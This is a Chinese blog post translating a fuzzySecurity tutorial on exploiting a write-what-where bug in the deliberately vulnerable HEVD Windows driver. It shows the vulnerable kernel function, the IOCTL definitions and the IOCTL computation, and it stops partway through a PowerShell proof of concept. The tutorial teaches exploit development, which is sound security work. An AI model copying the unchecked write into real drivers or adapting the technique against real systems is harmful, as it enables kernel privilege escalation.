@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写 | r00tk1t&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第二篇。点击查看原文。">
+<meta name="keywords" content="windows,novice">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写">
+<meta property="og:url" content="https://r00tk1ts.github.io/2018/02/01/内核利用程序之任意位置任意写/index.html">
+<meta property="og:site_name" content="r00tk1t&#39;s blog">
+<meta property="og:description" content="fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第二篇。点击查看原文。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_1.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_2.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_3.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_4.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_5.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_6.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_7.jpg">
+<meta property="og:updated_time" content="2020-10-20T13:01:02.390Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写">
+<meta name="twitter:description" content="fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第二篇。点击查看原文。">
+<meta name="twitter:image" content="https://r00tk1ts.github.io/images/exploit/fuzzySecurity/20180201_1.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="r00tk1t&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">r00tk1t</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">二进制安全 | Web安全 | 伪装成程序员的菜鸡</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/tags">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="mailto: 1903442252@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/r00tk1ts" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/r00tk1t-5" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/2698344533" title="weibo">weibo</a>
+                            
+                                <a class="fl QQ" target="_blank" href="https://user.qzone.qq.com/1903442252" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/SEH-overwrite/" style="font-size: 10px;">SEH overwrite</a> <a href="/tags/algorithm/" style="font-size: 11.67px;">algorithm</a> <a href="/tags/browser/" style="font-size: 10px;">browser</a> <a href="/tags/chrome/" style="font-size: 16.67px;">chrome</a> <a href="/tags/chrome-sandbox/" style="font-size: 16.67px;">chrome-sandbox</a> <a href="/tags/cpp/" style="font-size: 20px;">cpp</a> <a href="/tags/cpp-primer/" style="font-size: 18.33px;">cpp-primer</a> <a href="/tags/cpp-templates/" style="font-size: 11.67px;">cpp-templates</a> <a href="/tags/dll-hooking/" style="font-size: 10px;">dll hooking</a> <a href="/tags/exploit/" style="font-size: 12.5px;">exploit</a> <a href="/tags/glibc/" style="font-size: 10px;">glibc</a> <a href="/tags/glibc-heap/" style="font-size: 13.33px;">glibc-heap</a> <a href="/tags/linux/" style="font-size: 10.83px;">linux</a> <a href="/tags/linux-kernel/" style="font-size: 14.17px;">linux-kernel</a> <a href="/tags/mmap/" style="font-size: 10px;">mmap</a> <a href="/tags/novice/" style="font-size: 17.5px;">novice</a> <a href="/tags/php/" style="font-size: 10.83px;">php</a> <a href="/tags/pool/" style="font-size: 10px;">pool</a> <a href="/tags/pwn/" style="font-size: 19.17px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 15px;">pwnable.kr</a> <a href="/tags/resources/" style="font-size: 10px;">resources</a> <a href="/tags/stack-overrun/" style="font-size: 11.67px;">stack-overrun</a> <a href="/tags/tutorial/" style="font-size: 10px;">tutorial</a> <a href="/tags/ulk/" style="font-size: 14.17px;">ulk</a> <a href="/tags/web/" style="font-size: 10.83px;">web</a> <a href="/tags/windows/" style="font-size: 15.83px;">windows</a> <a href="/tags/windows-kernel/" style="font-size: 14.17px;">windows-kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/wrk/" style="font-size: 12.5px;">wrk</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://eternalsakura13.com">樱花师傅</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://chybeta.github.io/">Chybeta</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">k0shl</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.github.io/">o0xmuhe</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bestwing.me/">swing</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://yixuankeer.win/">joker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/">王松_Striker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy/">l3m0n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://0x48.pw/">Hcamael</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.nuptzj.cn/">画船听雨</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.bodkin.ren/">老锥</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.zerokeeper.com/">ZeroKeeper</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.ycjcl.cc/">信鑫</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.wowotech.net/">wowotech</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://fuzzysecurity.com/">fuzzySecurity</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://rootkits.xyz/">rootkits.xyz</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pentestingexperts.com/">pentestingexperts</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.skylined.nl/">skylined</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://systemk1t.github.io/">systemk1t</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">二进制狗一枚，懂点Web安全，一个伪装成程序员混迹在某公司的菜鸡。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">r00tk1t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">r00tk1t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">二进制安全 | Web安全 | 伪装成程序员的菜鸡</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/tags">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="mailto: 1903442252@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/r00tk1ts" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/r00tk1t-5" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/2698344533" title="weibo">weibo</a>
+                    
+                        <a class="QQ" target="_blank" href="https://user.qzone.qq.com/1903442252" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-内核利用程序之任意位置任意写" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/02/01/内核利用程序之任意位置任意写/" class="article-date">
+      <time datetime="2018-02-01T15:49:11.000Z" itemprop="datePublished">2018-02-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Windows exploit系列教程第十一部分：内核利用程序之任意位置任意写
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/exploit/">exploit</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/novice/">novice</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第二篇。<a href="http://fuzzysecurity.com/tutorials/expDev/15.html" target="_blank" rel="noopener">点击查看原文</a>。</p>
+<a id="more"></a>
+<h1 id="内核利用程序之任意位置任意写"><a href="#内核利用程序之任意位置任意写" class="headerlink" title="内核利用程序之任意位置任意写"></a>内核利用程序之任意位置任意写</h1><p>欢迎来到Windows exp开发系列的第十一部分。今天我们会使用HEVD来编写一个内核层任意位置任意写的漏洞exp。关于调试环境安装的细节请参考第十部分。因为时间有限，我一般会非常快速的过一遍这些邮件，但如果你有任何疑问的话请依然让我知晓，我们开始吧！</p>
+<ul>
+<li><p>HackSysExtremeVulnerableDriver (hacksysteam) - <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="noopener">here</a></p>
+</li>
+<li><p>Driver write-what-where vulnerability - <a href="http://www.dimitrifourny.com/2014/03/16/driver-write-what-where-vulnerability/" target="_blank" rel="noopener">here</a></p>
+</li>
+<li><p>Arbitrary Memory Overwrite exploitation using HalDispatchTable - <a href="http://poppopret.blogspot.co.uk/2011/07/windows-kernel-exploitation-basics-part.html" target="_blank" rel="noopener">here</a></p>
+</li>
+</ul>
+<h2 id="侦查挑战"><a href="#侦查挑战" class="headerlink" title="侦查挑战"></a>侦查挑战</h2><p>让我们看一看含有该漏洞的函数(<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Source/ArbitraryOverwrite.c" target="_blank" rel="noopener">here</a>)。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">TriggerArbitraryOverwrite</span><span class="params">(IN PWRITE_WHAT_WHERE UserWriteWhatWhere)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line"> </span><br><span class="line">    PAGED_CODE();</span><br><span class="line"> </span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        ProbeForRead((PVOID)UserWriteWhatWhere,</span><br><span class="line">                     <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">                     (ULONG)__alignof(WRITE_WHAT_WHERE));</span><br><span class="line"> </span><br><span class="line">        DbgPrint(<span class="string">"[+] UserWriteWhatWhere: 0x%p\n"</span>, UserWriteWhatWhere);</span><br><span class="line">        DbgPrint(<span class="string">"[+] WRITE_WHAT_WHERE Size: 0x%X\n"</span>, <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE));</span><br><span class="line">        DbgPrint(<span class="string">"[+] UserWriteWhatWhere-&gt;What: 0x%p\n"</span>, UserWriteWhatWhere-&gt;What);</span><br><span class="line">        DbgPrint(<span class="string">"[+] UserWriteWhatWhere-&gt;Where: 0x%p\n"</span>, UserWriteWhatWhere-&gt;Where);</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is properly validating if address</span></span><br><span class="line">        <span class="comment">// pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()</span></span><br><span class="line">        <span class="comment">// routine before performing the write operation</span></span><br><span class="line">        ProbeForRead((PVOID)UserWriteWhatWhere-&gt;Where,</span><br><span class="line">                     <span class="keyword">sizeof</span>(PULONG),</span><br><span class="line">                     (ULONG)__alignof(PULONG));</span><br><span class="line">        ProbeForRead((PVOID)UserWriteWhatWhere-&gt;What,</span><br><span class="line">                     <span class="keyword">sizeof</span>(PULONG),</span><br><span class="line">                     (ULONG)__alignof(PULONG));</span><br><span class="line"> </span><br><span class="line">        *(UserWriteWhatWhere-&gt;Where) = *(UserWriteWhatWhere-&gt;What);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Arbitrary Overwrite\n"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is writing the value pointed by 'What' to memory location</span></span><br><span class="line">        <span class="comment">// pointed by 'Where' without properly validating if the values pointed by 'Where'</span></span><br><span class="line">        <span class="comment">// and 'What' resides in User mode</span></span><br><span class="line">        *(UserWriteWhatWhere-&gt;Where) = *(UserWriteWhatWhere-&gt;What);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">"[-] Exception Code: 0x%X\n"</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该驱动持有两个指针，一个用于展示驱动将写入内存的值，另一个提供了驱动将要写的位置。同样的，显示了漏洞的同时也显示了安全的实现体。这里的问题在于驱动没有检查目标指针的地址是否在用户空间，因此我们可以用任意4字节值覆写任意内核4字节地址。</p>
+<p>此前我们看到过如何通过分析IrpDeviceIoCtlHandler表来获取函数的IOCTL。这里我们将学习一种不同的方法。驱动头文件<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/Source/HackSysExtremeVulnerableDriver.h" target="_blank" rel="noopener">driver header</a>展示了所有的定义的函数。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, </span></span><br><span class="line">METHOD_NEITHER, FILE_ANY_ACCESS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">I/O Control Codes (IOCTL's) are composed of a few different components (type, code, method, access). The interesting thing is that the Windows driver kit has a standard macro which can be used to define new IOCTL's. We can actually extract all the valid IOCTL's by emulating the macro functionality as show below.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">PowerShell v3+:</span><br><span class="line"><span class="string">"&#123;0:X&#125;"</span> -f $((<span class="number">0x00000022</span> -shl <span class="number">16</span>) -bor (<span class="number">0x00000000</span> -shl <span class="number">14</span>) -bor (FUNC_NUM_HERE -shl <span class="number">2</span>) -bor <span class="number">0x00000003</span>)</span><br><span class="line"></span><br><span class="line">C++\C#:</span><br><span class="line">(<span class="number">0x00000022</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0x00000000</span> &lt;&lt; <span class="number">14</span>) | (FUNC_NUM_HERE &lt;&lt; <span class="number">2</span>) | <span class="number">0x00000003</span></span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE = <span class="number">0x802</span></span><br><span class="line">=&gt; <span class="string">"&#123;0:X&#125;"</span> -f $((<span class="number">0x00000022</span> -shl <span class="number">16</span>) -bor (<span class="number">0x00000000</span> -shl <span class="number">14</span>) -bor (<span class="number">0x802</span> -shl <span class="number">2</span>) -bor <span class="number">0x00000003</span>)</span><br><span class="line">=&gt; IOCTL = <span class="number">0x22200B</span></span><br></pre></td></tr></table></figure>
+<p>I/O控制码（IOCTL’s）又一些不同的组件（类型，码值，方法，访问权限）构成。有意思的是WDK有一个标准的宏可以用于定义新的IOCTL。我们实际上可以通过仿真该宏的功能来提取出所有的有效的IOCTL。</p>
+<p>阅读更多关于宏的说明<a href="https://msdn.microsoft.com/en-us/library/ms902086.aspx" target="_blank" rel="noopener">here</a>。现在我们有了IOCTL，让我们使用IDA的图形显示板快速的检查一下。</p>
+<p><img src="/images/exploit/fuzzySecurity/20180201_1.jpg" alt=""></p>
+<p>看起来不错，有个稍微让我困惑的事情是函数要如何决定它将要写哪些字节。它不会写你给它的4字节，它会把这4字节当成一个指针并写入该指针指向的地址处开始的4字节值。缓冲区结构如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># The first 4 bytes are a pointer to a pointer</span><br><span class="line">[IntPtr]$WriteWhatPtr(-&gt;$WriteWhat) + $WriteWhere</span><br></pre></td></tr></table></figure>
+<p>记住这一点，如果你简单的指定你的shellcode的地址，它实际上会写你的shellcode的前4个字节。</p>
+<p>我快速组织了一个POC来测试能否顺利调用这个函数。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> -TypeDefinition <span class="string">@"</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Diagnostics;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">using System.Security.Principal;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">public static class EVD</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]</span></span><br><span class="line"><span class="string">    public static extern IntPtr CreateFile(</span></span><br><span class="line"><span class="string">        String lpFileName,</span></span><br><span class="line"><span class="string">        UInt32 dwDesiredAccess,</span></span><br><span class="line"><span class="string">        UInt32 dwShareMode,</span></span><br><span class="line"><span class="string">        IntPtr lpSecurityAttributes,</span></span><br><span class="line"><span class="string">        UInt32 dwCreationDisposition,</span></span><br><span class="line"><span class="string">        UInt32 dwFlagsAndAttributes,</span></span><br><span class="line"><span class="string">        IntPtr hTemplateFile);</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    [DllImport("Kernel32.dll", SetLastError = true)]</span></span><br><span class="line"><span class="string">    public static extern bool DeviceIoControl(</span></span><br><span class="line"><span class="string">        IntPtr hDevice,</span></span><br><span class="line"><span class="string">        int IoControlCode,</span></span><br><span class="line"><span class="string">        byte[] InBuffer,</span></span><br><span class="line"><span class="string">        int nInBufferSize,</span></span><br><span class="line"><span class="string">        byte[] OutBuffer,</span></span><br><span class="line"><span class="string">        int nOutBufferSize,</span></span><br><span class="line"><span class="string">        ref int pBytesReturned,</span></span><br><span class="line"><span class="string">        IntPtr Overlapped);</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    [DllImport("kernel32.dll")]</span></span><br><span class="line"><span class="string">    public static extern uint GetLastError();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"@</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$hDevice</span> = [EVD]::CreateFile(<span 